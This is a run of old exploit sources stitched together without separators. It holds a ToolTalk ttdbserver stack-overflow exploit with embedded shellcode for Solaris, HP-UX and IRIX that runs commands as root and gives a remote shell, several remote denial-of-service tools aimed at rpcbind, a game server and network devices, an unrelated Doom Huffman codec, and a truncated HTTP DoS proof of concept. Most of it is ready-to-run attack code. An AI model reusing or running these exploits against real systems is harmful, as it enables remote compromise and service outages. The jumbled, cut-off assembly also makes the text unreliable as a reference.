 Irix (tested on r5k and r10k O2 6.3), 
 HP-UX ( tested on 700s 10.20)

 usage: ./r [-ku] [-p port] [-f outfile] host cmd
           -k : kill ttdbserver (read below)
           -u : use UDP (default TCP)
           -p port : connect to ttdbserver at port (don't ask portmap)
           -f outfile : store rpc message in outfile (and do NOT contact host)

 note:
   it should compile on any normal system, to get HP-UX exploit compile with 
     -DHPUX, for Solaris -DSOLARIS, for Irix use -DIRIX
   cmd is run through sh -c, and there is no practical limit for command 
     length, but it has to fit in buffer (1024 bytes in this case), 
     and ~(strlen + 1) cannot contain '0'
   by default ttdbserver runs from inetd, so it will be respawned each time
     it die (I mean execute command), also because it dies correct reply is
     clnt_call error (connection reset, timeout etc)
   -f file option: On HP-UX and Irix, connected socket gets first free
     descriptor, 3 on HP-UX and 5 on Irix. You can use -f option to store
     datagram to file, and send it to ttdbserver with your telnet of 
     choice.  With command like "0<&3 1>&3 2>&3 exec sh" on HP-UX you'll get
     remote shell running. Solaris dup() connected fd to first free one
     over 256, so you have to study sh man page to find a way to do this <g>
     You should kill ttdbserver before, to make sure it doesn't have
     any files open except 0-2 fds passed from inetd. Actually on Irix
     it looks like fucked up, ttdbserver gets 0-2 fds from inetd, ignores
     them and opens new ones as 3 and 4 fd, so you need to redirect 5th fd.
     It happens on 6.3 at least, I need to look at other versions.
     Irix is also the only one I saw which supports ttdbserver over UDP,
     keep in mind that by default generated RPC datagram is TCP version with
     record marking, you should use -u option to get UDP version (or just remove
     first four bytes from generated file)
  for reasons I can't quite understand, you _have_ to kil ttdbserver on Solaris
    before sending a command there. When ttdbserver has connected clients,
    it simply returns an error (filename too long). In both cases
    it looks like the program goes through the same way, well, maybe I'll
    get a clue one day what happens there.
  On Irix to get over its fucked up cache, I simply send like 20kb to make
    it flushed, so it's not reliable. You can find a buffer allocated by xdr 
    and it should be better. 
  surprizingly there are some differences between ttdbserver on above platforms,
    like solaris dup() of fds, start-up Irix behaviour, the fact that
    on Irix it first tries chdir to directory then do some task (it's the
    reason I have to add "/f" at the end of buffer to have it copy overflow
    part of the buffer on stack) etc. That's why it may not work on other
    systems and versions than mentioned at the beginning.

 */

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>

#define PORT 0
#define BSIZE 1024

#if defined(SOLARIS)
# define SP 0xefffd618
# define LENOFS 80
char asmcode[]="\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x92\x03\xe0\x48\x90\x02\x60\x10\xe0\x02\x3f\xf0\xa2\x80\x3f\xff\xa0\x24\x40\x10\xd0\x22\x3f\xf0\xc0\x22\x3f\xfc\xa2\x02\x20\x09\xc0\x2c\x7f\xff\xe2\x22\x3f\xf4\xa2\x04\x60\x03\xc0\x2c\x7f\xff\xe2\x22\x3f\xf8\xa2\x04\x40\x10\xc0\x2c\x7f\xff\x82\x10\x20\x0b\x91\xd0\x20\x08\xff\xff\xff\xfc\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44\x2f\x62\x69\x6e\x2f\x6b\x73\x68\x2e\x2d\x63\x2e";
char NOP[]="\x80\x1c\x40\x11";
#endif

#if defined(HPUX)
# define SP 0x7b03cc10
# define LENOFS 84
char asmcode[]="\xeb\x40\x40\x02\x0b\x39\x02\x80\xd7\x40\x0c\x1e\xb7\x5a\x20\xb8\x0b\x5a\x02\x59\x0f\x21\x10\x98\x97\x18\x07\xff\x0f\x39\x12\x81\x0f\x20\x12\x99\xb7\x39\x20\x10\x0f\x20\x12\x1f\x0f\x59\x12\x89\xb7\x39\x20\x06\x0f\x20\x12\x1f\x0f\x59\x12\x91\x0b\x38\x06\x19\x0f\x20\x12\x1f\xb7\x59\x07\xe1\x20\x20\x08\x01\xe4\x20\xe0\x08\xb4\x16\x10\x16\x11\x11\x11\x11\x22\x22\x22\x22\x33\x33\x33\x33\x44\x44\x44\x44\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x63\x2e";
char NOP[]="\x0b\x39\x02\x80";
#endif

#if defined(IRIX)
# define SP 0x7fff1b30
# define LENOFS 76
char asmcode[]="\x04\x10\xff\xff\x27\xe4\x01\x01\x24\x84\xff\x5e\x8c\x8c\xff\xe5\x24\x0d\xff\xff\x01\xac\x60\x23\x01\x84\x60\x20\xa1\x80\xff\xff\xa0\x80\xff\xff\xac\x84\xff\xed\x24\x84\xff\xfd\xa0\x80\xff\xff\xac\x84\xff\xec\x24\x84\xff\xf8\x24\x85\xff\xf0\xac\x84\xff\xf0\xac\x80\xff\xfc\x24\x02\x03\xf3\x02\x04\x8d\x0c\xff\xff\xff\xfc\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x22\x2f\x62\x69\x6e\x2f\x73\x68\x2e\x2d\x63\x2e";
char NOP[]="\x24\x0f\x12\x34";

#endif

#define TT_DBSERVER_PROG 100083
#define TT_DBSERVER_VERS 1
#define _TT_P 7

struct tt_reply {
  int i1;
  int i2;
};

void usage(char *s) {
  printf("Usage: %s [-ku] [-p port] [-f outfile] host cmd\n", s);
  exit(0);
}

bool_t xdr_tt_reply(XDR *xdrs, struct tt_reply *objp) {

  if (!xdr_int(xdrs, &objp->i1))
    return (FALSE);
  if (!xdr_int(xdrs, &objp->i2)) 
    return (FALSE);
  return (TRUE);
}

void make_file(char *fname, char *buf, int type);

main(int argc, char *argv[]) {
  extern int optind;
  extern char *optarg;
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct hostent *hp;
  struct sockaddr_in target;
  struct tt_reply op_res;
  char buf[64000], *path, *cmd, *host, *bp, *outfile = NULL;
  int sd, i, sp = SP, bsize = BSIZE, port = PORT, kill = 0, proto = 0;

  while ((i = getopt(argc, argv, "ukp:f:")) != EOF)
    switch (i) {
      case 'p':
        port = atoi(optarg);
        break;
      case 'k':
        kill = 1;
        break;
      case 'u':
        proto = 1;
        break;
      case 'f':
        outfile = optarg;
        break;
      default:
        usage(argv[0]);
    }
  if (argc - optind < 2)
    usage(argv[0]);
  cmd = argv[optind + 1];
  host = argv[optind];

  for (i = 0; i < sizeof(buf); i++)
    *(buf + i) = NOP[i % 4];

  i = bsize - strlen(asmcode) - strlen(cmd);
  i &= 0xfffffffc;
  strcpy(buf + i, asmcode);
  strcat(buf, cmd);
  *(int *)(buf + i + LENOFS) = ~(strlen(cmd) + 1);
  buf[strlen(buf)] = '.';
  bp = buf + bsize;
  for (i = 0; i < 16; bp+=4, i++)
    *(int *)bp = sp;
#ifdef IRIX
  sp = sp + 400 + 31652;
  for (i = 0; i < 5000; bp+=4, i++)
    *(int *)bp = sp;
  *bp++ = '/';
  *bp++ = 'f';
  path = buf + 2;
#else
  path = buf;
#endif
  *bp = 0;

  if (outfile) {
    make_file(outfile, buf, proto);
    printf("rpc datagram stored in %s\n", outfile);
    exit(0);
  }

  if ((target.sin_addr.s_addr = inet_addr(host)) == -1) {
    if ((hp = gethostbyname(host)) == NULL) {
      printf("%s: cannot resolve\n", host);
      exit(1); 
    } else
      target.sin_addr.s_addr = *(u_long *)hp->h_addr;
  }
  target.sin_family = AF_INET;
  target.sin_port = htons(port);
  sd = RPC_ANYSOCK;

  tm.tv_sec = 4;
  tm.tv_usec = 0;
  if (proto) 
    cl = clntudp_create(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, tm, &sd);
  else
    cl = clnttcp_create(&target, TT_DBSERVER_PROG, TT_DBSERVER_VERS, &sd, 0, 0);
  if (cl == NULL) {
    clnt_pcreateerror("clnt_create");
    exit(0);
  }
  cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);
  tm.tv_sec = 10;

  if (kill) {
    path = NULL;
    bp = NULL;
    if ((stat = clnt_call(cl, 15, xdr_wrapstring, (char *)&path, 
        xdr_wrapstring, (char *)&bp, tm)) != RPC_SUCCESS) {
      clnt_perror(cl, "clnt_call");
      exit(1);
    }
    printf("Could not kill ttdbserver, reply is: %s\n", bp);
    exit(1);
  }

  if ((stat = clnt_call(cl, _TT_P, xdr_wrapstring, (char *)&path, xdr_tt_reply, 
       (char *)&op_res, tm)) != RPC_SUCCESS) {
    clnt_perror(cl, "clnt_call");
    exit(1);
  }
  printf("res i1 %d, res i2 %d\n", op_res.i1, op_res.i2);
  clnt_destroy(cl);
}

void make_file(char *fname, char *buf, int type) {
  int fd, offs;
  XDR xdrm;
  struct rpc_msg rpc_hdr;
  struct authunix_parms aup;
  char dgram[64000], rauth[MAX_AUTH_BYTES];

  if (type == 1) /* UDP */
    offs = 4;
  if ((fd = open(fname, O_RDWR | O_CREAT | O_TRUNC, 0666)) == -1) {
    perror(fname);
    exit(1);
  }
  xdrmem_create(&xdrm, rauth, sizeof(rauth), XDR_ENCODE);
  aup.aup_time = (u_long)time(NULL);
  aup.aup_machname = "localhost";
  aup.aup_uid = 0;
  aup.aup_gid = 0;
  aup.aup_len = 0;
  aup.aup_gids = NULL;
  if (xdr_authunix_parms(&xdrm, &aup) == FALSE) {
    printf("error encoding auth cred\n");
    exit(1);
  }
  rpc_hdr.rm_call.cb_cred.oa_length = xdr_getpos(&xdrm);
  xdr_destroy(&xdrm);
  xdrmem_create(&xdrm, dgram + 4, sizeof(dgram), XDR_ENCODE);
  rpc_hdr.rm_xid = 0x12345678;
  rpc_hdr.rm_direction = CALL;
  rpc_hdr.rm_call.cb_rpcvers = 2;
  rpc_hdr.rm_call.cb_prog = TT_DBSERVER_PROG;
  rpc_hdr.rm_call.cb_vers = TT_DBSERVER_VERS;
  rpc_hdr.rm_call.cb_proc = _TT_P;
  rpc_hdr.rm_call.cb_cred.oa_flavor = AUTH_UNIX;
  rpc_hdr.rm_call.cb_cred.oa_base = rauth;
  rpc_hdr.rm_call.cb_verf.oa_flavor = AUTH_NONE;
  rpc_hdr.rm_call.cb_verf.oa_base = NULL;
  rpc_hdr.rm_call.cb_verf.oa_length = 0;
  if (xdr_callmsg(&xdrm, &rpc_hdr) == FALSE) {
    printf("error encoding rpc header\n");
    exit(1);
  }
  if (xdr_wrapstring(&xdrm, &buf) == FALSE) {
    printf("error encoding rpc data\n");
    exit(1);
  }
  /* record marking */
  *(u_int *)dgram = 0x80000000 | xdr_getpos(&xdrm);
  if (write(fd, dgram + offs, xdr_getpos(&xdrm) + 4) == -1) {
    perror("write");
    exit(1);
  }
  xdr_destroy(&xdrm);
  close(fd);
}

source: http://www.securityfocus.com/bid/21964/info

The Solaris operating system is prone to a denial-of-service vulnerability. 

An attacker can exploit this issue to crash the 'rpcbind(1M)' server, denying service to legitimate users.

/*
////////////////////////////////////////////////////////////
// Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS
////////////////////////////////////////////////////////////
//
// Federico L. Bossi Bonin
// fbossi[at]globalST[dot]com[dot]ar
/////////////////////////////////////////////////////


Program received signal SIGSEGV, Segmentation fault.
0xff29b5f4 in __inet_taddr2uaddr () from /usr/lib/libnsl.so.1
(gdb) backtrace
#0  0xff29b5f4 in __inet_taddr2uaddr () from /usr/lib/libnsl.so.1
#1  0x00013d88 in rpcbproc_taddr2uaddr_com ()
#2  0x000161c0 in rpcb_service_4 ()
(gdb)

*/

#include <string.h>
#include <rpc/rpc.h>

struct xdr {
        long long_arg;
        char *string_arg;
};

typedef struct xdr xdr;
static struct timeval TIMEOUT = { 25, 0 };

bool_t xdr_xdr (XDR *xdrs, xdr *objp) {
        register int32_t *buf;

         if (!xdr_long (xdrs, &objp->long_arg))
                 return FALSE;
         if (!xdr_string (xdrs, &objp->string_arg, 4096))
                 return FALSE;
        return TRUE;
}

char ** str_4(xdr *argp, CLIENT *clnt) {
        static char *clnt_res;

        memset((char *)&clnt_res, 0, sizeof(clnt_res));
        if (clnt_call (clnt, 8,
                (xdrproc_t) xdr_xdr, (caddr_t) argp,
                (xdrproc_t) xdr_wrapstring, (caddr_t) &clnt_res,
                TIMEOUT) != RPC_SUCCESS) {
                return (NULL);
        }
        return (&clnt_res);
}

main(int argc, char *argv[]) {
  CLIENT *c1;
  char *server;
  char **sresult;


  if (argc !=2){
    printf("=============================================================\n");
    printf("Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS\n");
    printf("-------------------------------------------------------------\n");
    printf("Federico L. Bossi Bonin <fbossi@globalST.com.ar>\n");
    printf("=============================================================\n\n");
    printf("usage: %s <IP>\n",argv[0]);
    exit(1);
  }

  server = argv[1];

if ((c1 = clnt_create(server,100000, 4, "tcp")) == NULL){
       clnt_pcreateerror(server);
    exit(1);
  }

  xdr xdrmessage;
  xdrmessage.long_arg = 0;
  xdrmessage.string_arg="";

  if ((sresult = str_4(&xdrmessage, c1)) == NULL){
   clnt_perror(c1, server);
   exit(1);
  }

  clnt_destroy(c1);
  exit(0);
}/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define BUFFSZ      0x3ff6
#define PORT        27960

#define V4P_NICETOMEETYOU               0xF903
#define V4P_MAYINTRODUCEMYSELF          0xF902
#define V4P_MAYINTRODUCEYOURSELF        0xF901
#define V4P_INTRODUCEMETOALLYOURCLIENTS 0xF900
#define V4P_LEAVEOK                     0xF805
#define V4P_S_RESENDPACKAGES            0xF804
#define V4P_S_DUNNO                     0xF803
#define V4P_S_SHUTDOWN                  0xF802
#define V4P_S_JOINOK                    0xF801
#define V4P_SP_REJECTJOIN               0xF800
#define V4P_REJECT                      0xF101
#define V4P_MESSAGE                     0xF100
#define V4P_C_RESENDPACKAGES            0xF003
#define V4P_C_DUNNO                     0xF002
#define V4P_C_LEAVE                     0xF001
#define V4P_C_JOIN                      0xF000



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            pck,
            attack;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Some bugs in SunAge <= 1.08.1 "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = integer overflow\n"
            " 2 = endless loop\n"
            " 3 = runtime error\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    if(attack == 1) {
        p = buff;
        p += putxx(p, 0xff,         8);
        p += putxx(p, 0,            16);
        len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);

    } else if(attack == 2) {
        for(pck = 0; pck <= 2; pck++) {
            p = buff;
            switch(pck) {
                case 0: {
                    p += putxx(p, 0xff,         8);
                    p += putxx(p, V4P_C_JOIN,   16);
                    p += putxx(p, 0,            32);
                    p += putxx(p, 0,            16);
                    break;
                }
                case 1: {
                    p += putxx(p, 0x80,         8);
                    p += putxx(p, V4P_C_JOIN,   16);
                    p += putxx(p, 0,            32);
                    p += putxx(p, 0,            16);
                    break;
                }
                case 2: {
                    p += putxx(p, 0xff,         8);
                    p += putxx(p, 0xe030,       16);
                    p += putxx(p, 0,            16);
                    p += putxx(p, 0,            16);
                    p += putxx(p, 0,            16);
                    break;
                }
                default: break;
            }

            len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);
        }

    } else if(attack == 3) {
        for(pck = 0; pck <= 2; pck++) {
            p = buff;
            switch(pck) {
                case 0: {
                    p += putxx(p, 0xff,         8);
                    p += putxx(p, V4P_C_JOIN,   16);
                    p += putxx(p, 0,            32);
                    p += putxx(p, 0,            16);
                    break;
                }
                case 1: {
                    p += putxx(p, 0x80,         8);
                    p += putxx(p, V4P_C_JOIN,   16);
                    p += putxx(p, 0,            32);
                    p += putxx(p, 0,            16);
                    break;
                }
                case 2: {
                    p += putxx(p, 0x80,         8);
                    p += putxx(p, 0xe030,       16);
                    p += putxx(p, 0,            16);
                    p += sprintf(p, "%s", "nickname") + 1;
                    break;
                }
                default: break;
            }

            len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);
        }
    }

    close(sd);
    return(0);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 1)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-1);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/9795/info
 
An issue in the handling of specific web requests by SureCom network devices has been identified. By placing a malformed request to the web configuration interface, it is possible for an attacker to deny service to legitimate users of a vulnerable device.


#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>

int main(int argc, char *argv[]) {
        if(argc < 3) {
                printf("SureCom Network Device
DoS,\n");
                printf("by shaun2k2 -
shaunige@yahoo.co.uk\n\n");
                printf("Usage: %s <host> <port>\n",
argv[0]);
                exit(-1);
        }

        int sock;
        struct hostent *he;
        struct sockaddr_in dest;

        if((he = gethostbyname(argv[1])) == NULL) {
                herror("gethostbyname()");
                exit(-1);
        }


        printf("SureCom Network Device DoS,\n");
        printf("by shaun2k2 -
shaunige@yahoo.co.uk\n\n");

        printf("[+] Crafting exploit buffer...\n\n");
        char explbuf[] = "GET /
HTTP/1.1\r\nAuthorization: B 00000000\r\n\r\n";

        if((sock = socket(AF_INET, SOCK_STREAM, 0)) <
0) {
                perror("socket()");
                exit(-1);
        }

        dest.sin_family = AF_INET;
        dest.sin_port = htons(atoi(argv[2]));
        dest.sin_addr = *((struct in_addr
*)he->h_addr);

        printf("[+] Connecting...\n");
        if(connect(sock, (struct sockaddr *)&dest,
sizeof(struct sockaddr)) < 0) {
                perror("socket()");
                exit(-1);
        }

        printf("[+] Connected!\n\n");

        printf("[+] Sending malicious HTTP
request...\n");
        send(sock, explbuf, strlen(explbuf), 0);
        sleep(2);
        close(sock);

        printf("[+] Done!\n");

        return(0);
}/*
Doom huffman 0.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

  source code from Doom (X-Doom/old Zdaemon code)

*/

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#include <ctype.h>
#include <math.h>

#define MAX_UDP_PACKET  1400    // modify it if you want

int LastCompMessageSize = 0;

typedef struct
{
    struct huffnode_s *zero;
    struct huffnode_s *one;
    unsigned char val;
    float freq;
} huffnode_s, huffnode_t;

typedef struct
{
    unsigned int bits;
    int len;
} hufftab_t;
static huffnode_t *HuffTree=0;
static hufftab_t HuffLookup[256];

static float HuffFreq[256]=
{
	0.14473691,	0.01147017,	0.00167522,	0.03831121,
	0.00356579,	0.03811315,	0.00178254,	0.00199644,
	0.00183511,	0.00225716,	0.00211240,	0.00308829,
	0.00172852,	0.00186608,	0.00215921,	0.00168891,
	0.00168603,	0.00218586,	0.00284414,	0.00161833,
	0.00196043,	0.00151029,	0.00173932,	0.00218370,
	0.00934121,	0.00220530,	0.00381211,	0.00185456,
	0.00194675,	0.00161977,	0.00186680,	0.00182071,
	0.06421956,	0.00537786,	0.00514019,	0.00487155,
	0.00493925,	0.00503143,	0.00514019,	0.00453520,
	0.00454241,	0.00485642,	0.00422407,	0.00593387,
	0.00458130,	0.00343687,	0.00342823,	0.00531592,
	0.00324890,	0.00333388,	0.00308613,	0.00293776,
	0.00258918,	0.00259278,	0.00377105,	0.00267488,
	0.00227516,	0.00415997,	0.00248763,	0.00301555,
	0.00220962,	0.00206990,	0.00270369,	0.00231694,
	0.00273826,	0.00450928,	0.00384380,	0.00504728,
	0.00221251,	0.00376961,	0.00232990,	0.00312574,
	0.00291688,	0.00280236,	0.00252436,	0.00229461,
	0.00294353,	0.00241201,	0.00366590,	0.00199860,
	0.00257838,	0.00225860,	0.00260646,	0.00187256,
	0.00266552,	0.00242641,	0.00219450,	0.00192082,
	0.00182071,	0.02185930,	0.00157439,	0.00164353,
	0.00161401,	0.00187544,	0.00186248,	0.03338637,
	0.00186968,	0.00172132,	0.00148509,	0.00177749,
	0.00144620,	0.00192442,	0.00169683,	0.00209439,
	0.00209439,	0.00259062,	0.00194531,	0.00182359,
	0.00159096,	0.00145196,	0.00128199,	0.00158376,
	0.00171412,	0.00243433,	0.00345704,	0.00156359,
	0.00145700,	0.00157007,	0.00232342,	0.00154198,
	0.00140730,	0.00288807,	0.00152830,	0.00151246,
	0.00250203,	0.00224420,	0.00161761,	0.00714383,
	0.08188576,	0.00802537,	0.00119484,	0.00123805,
	0.05632671,	0.00305156,	0.00105584,	0.00105368,
	0.00099246,	0.00090459,	0.00109473,	0.00115379,
	0.00261223,	0.00105656,	0.00124381,	0.00100326,
	0.00127550,	0.00089739,	0.00162481,	0.00100830,
	0.00097229,	0.00078864,	0.00107240,	0.00084409,
	0.00265760,	0.00116891,	0.00073102,	0.00075695,
	0.00093916,	0.00106880,	0.00086786,	0.00185600,
	0.00608367,	0.00133600,	0.00075695,	0.00122077,
	0.00566955,	0.00108249,	0.00259638,	0.00077063,
	0.00166586,	0.00090387,	0.00087074,	0.00084914,
	0.00130935,	0.00162409,	0.00085922,	0.00093340,
	0.00093844,	0.00087722,	0.00108249,	0.00098598,
	0.00095933,	0.00427593,	0.00496661,	0.00102775,
	0.00159312,	0.00118404,	0.00114947,	0.00104936,
	0.00154342,	0.00140082,	0.00115883,	0.00110769,
	0.00161112,	0.00169107,	0.00107816,	0.00142747,
	0.00279804,	0.00085922,	0.00116315,	0.00119484,
	0.00128559,	0.00146204,	0.00130215,	0.00101551,
	0.00091756,	0.00161184,	0.00236375,	0.00131872,
	0.00214120,	0.00088875,	0.00138570,	0.00211960,
	0.00094060,	0.00088083,	0.00094564,	0.00090243,
	0.00106160,	0.00088659,	0.00114514,	0.00095861,
	0.00108753,	0.00124165,	0.00427016,	0.00159384,
	0.00170547,	0.00104431,	0.00091395,	0.00095789,
	0.00134681,	0.00095213,	0.00105944,	0.00094132,
	0.00141883,	0.00102127,	0.00101911,	0.00082105,
	0.00158448,	0.00102631,	0.00087938,	0.00139290,
	0.00114658,	0.00095501,	0.00161329,	0.00126542,
	0.00113218,	0.00123661,	0.00101695,	0.00112930,
	0.00317976,	0.00085346,	0.00101190,	0.00189849,
	0.00105728,	0.00186824,	0.00092908,	0.00160896
};

void I_FatalError (const char *error, ...)
{
    va_list argptr;
    va_start (argptr, error);
    vprintf (error, argptr);
    va_end (argptr);
    exit(-1);
}

static void FindTab(huffnode_t *tmp,int len,unsigned int bits)
{
    if(!tmp)
        I_FatalError("no huff node");
    if (tmp->zero)
    {
        if(!tmp->one)
            I_FatalError("no one in node");
        if(len>=32)
            I_FatalError("compression screwd");
        FindTab((huffnode_t *)tmp->zero,len+1,bits<<1);
        FindTab((huffnode_t *)tmp->one,len+1,(bits<<1)|1);
        return;
    }
    HuffLookup[tmp->val].len=len;
    HuffLookup[tmp->val].bits=bits;
}

static unsigned char Masks[8]=
{
    0x01,   0x02,   0x04,   0x08,
    0x10,   0x20,   0x40,   0x80
};

static void PutBit(unsigned char *buf,unsigned pos,unsigned bit)
{
    if (bit)
        buf[pos >> 3] |= Masks[pos & 7];
    else
        buf[pos >> 3] &= ~Masks[pos & 7];
}

static unsigned GetBit(unsigned char *buf,unsigned pos)
{
    return ( buf[pos >> 3] & Masks[pos & 7] );
}

static void BuildTree(float *freq)
{
    float min1,min2;
    int i,j,minat1,minat2;
    huffnode_t *work[256];
    huffnode_t *tmp;

    for (i=0;i<256;i++)
    {
        work[i]=(huffnode_s *)malloc(sizeof(huffnode_t));
        work[i]->val=(unsigned char)i;
        work[i]->freq=freq[i];
        work[i]->zero=0;
        work[i]->one=0;
        HuffLookup[i].len=0;
    }
    for (i=0;i<255;i++)
    {
        minat1=-1;
        minat2=-1;
        min1=1E30;
        min2=1E30;
        for (j=0;j<256;j++)
        {
            if (!work[j])
                continue;
            if (work[j]->freq<min1)
            {
                minat2=minat1;
                min2=min1;
                minat1=j;
                min1=work[j]->freq;
            }
            else if (work[j]->freq<min2)
            {
                minat2=j;
                min2=work[j]->freq;
            }
        }
        if (minat1<0)
            I_FatalError("minatl: %d",minat1);
        if (minat2<0)
            I_FatalError("minat2: %d",minat2);

        tmp = (huffnode_s *)malloc(sizeof(huffnode_t));
        tmp->zero=(void *)work[minat2];
        tmp->one=(void *)work[minat1];
        tmp->freq=work[minat2]->freq+work[minat1]->freq;
        tmp->val=0xff;
        work[minat1]=tmp;
        work[minat2]=0;
    }
    HuffTree=tmp;
    FindTab(HuffTree,0,0);
}

void HuffDecode(unsigned char *in,unsigned char *out,int inlen,int *outlen)
{
    int             bits,nbits;
    huffnode_t      *tmp;
    unsigned char   *pout, *plast;

    pout = out;
    plast = out + 8*(MAX_UDP_PACKET+32)-1;

    if (*in==0xff)
    {
        if (inlen>1)
            memcpy(out,in+1,inlen-1);
        *outlen = inlen-1;
        return;
    }

    nbits = (inlen-1)*8 - (int)(unsigned) *in++;
    for (bits=0;  bits<nbits;   )
    {
        tmp = HuffTree;
        do
        {
            tmp = (GetBit(in,bits)) ? (huffnode_s *)tmp->one : (huffnode_s *)tmp->zero;
            bits++;
        }
        while (tmp->zero);
        *pout++ = tmp->val;
        if (pout>=plast)
        {
            printf("HuffDecode: overflow\n");
            break;
        }
    }

    *outlen = (int)(pout - out);
}

void HuffEncode(unsigned char *in,unsigned char *out,int inlen,int *outlen)
{
    int i,j,bitat;
    unsigned int t;
    bitat=0;
    for (i=0;i<inlen;i++)
    {
        t=HuffLookup[in[i]].bits;
        for (j=0;j<HuffLookup[in[i]].len;j++)
        {
            PutBit(out+1,bitat+HuffLookup[in[i]].len-j-1,t&1);
            t>>=1;
        }
        bitat+=HuffLookup[in[i]].len;
    }
    *outlen=1+(bitat+7)/8;
    *out=8*((*outlen)-1)-bitat;
	if(*outlen >= inlen+1)
	{
		*out=0xff;
		memcpy(out+1,in,inlen);
		*outlen=inlen+1;
	}
}

void HuffInit(void)
{
    BuildTree(HuffFreq);
}

/*
SW-HTTPD Server v0.x Denial of Service (PoC)

Multiple Connections with GET /A[100] HTTP/1.1
After server not found all pages.

Author: Jonathan Salwan
Mail  : submit [AT] shell-storm.org
Web   : http://www.shell-storm.org
*/

#include "stdio.h"
#include "unistd.h"
#include "stdlib.h"
#include "sys/types.h"
#include "sys/socket.h"
#include "netinet/in.h"

int syntax(char *file)
	{
	fprintf(stderr,"SW-HTTPD Server Denial of Service (PoC)\n");
	fprintf(stderr,"=>Syntax : <%s> <ip> <port>\n\n",file);
	exit(0);
	}

int main(int argc, char **argv)
{
	if (argc < 2)
		syntax(argv[0]);
	
	int port = atoi(argv[2]);

	int mysocket;
	int mysocket2;
	int srv_connect;
	int sockaddr_long;


        char hexa[100]  = 	"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
			  	"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30" 
                          	"\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
                                "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
